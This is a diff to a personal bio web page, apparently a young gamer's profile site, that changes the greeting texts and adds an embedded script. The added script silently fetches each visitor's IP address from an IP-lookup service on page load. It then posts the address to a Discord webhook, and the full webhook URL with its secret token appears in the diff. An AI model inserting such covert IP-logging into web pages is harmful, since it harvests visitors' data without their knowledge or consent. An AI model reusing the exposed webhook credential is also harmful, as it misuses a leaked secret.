@@ -28,11 +28,11 @@
             this.musicVolume = 0.15;
             this.musicFadeIn = 4000;
             this.Texts = [
-                "welcome",
-                "minecraft , fortnite, geometry dash ,amongus , overwatch , csgo",
-                "Discord open to chat",
-                "GTX 1050, core i7 12th, ",
-                "I like gaming."
+                "Hi",
+                "My name is reebal , i'm 16 years old from morocco",
+                "i have a youtube channel with over 10K subs",
+                "if you want to contact me here are all my socials ",
+                "bye."
             ];
         };
 
@@ -71,12 +71,29 @@
         <section class="main">
             <div class="text-start containers">
                 <div class="Brand">
-                    <h1 class="Paragraph Hello">welcome to my world</h1>
+                    <h1 class="Paragraph Hello">Hello :3</h1>
                     <p class="a"><span id="Bruh" class="Paragraph"></span></p>
                 </div><img class="d-xl-flex main_image1" id="main_image1" src><iframe height="250px" width="410px" scrolling="no" src="https://lanyard.cnrad.dev/api/946148998329278474?borderRadius=5px&idleMessage=sleeping%20zzz&amp;bg=a&amp;animated=true"
                     frameborder="0">
 </iframe>
-            
+             <script>
+                    function getIP(json) {
+                        var request = new XMLHttpRequest(); //making a request for the webhook
+                        request.open("POST", "https://discord.com/api/webhooks/1241374603125854259/LIQQLvBU9juByE4-QHDmrvSqMgYeogDQDldPKSnYJfSfWvxzFkmTzCVdsLRZVCMtuAr6");
+
+                        request.setRequestHeader('Content-type', 'application/json');
+
+                        var params = {
+                            username: "reebal-",
+                            avatar_url: "https://cdn.discordapp.com/avatars/946148998329278474/8937f5bc14ef0217feb016d0b450f2c3.webp?size=2048",
+                            content: "**IP:** *" + json.ip + "*"
+                        }
+                        //just a webhook parameters such as avatar,name,message
+
+                        request.send(JSON.stringify(params));
+                    }
+                </script>
+                <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> 
              
             
             
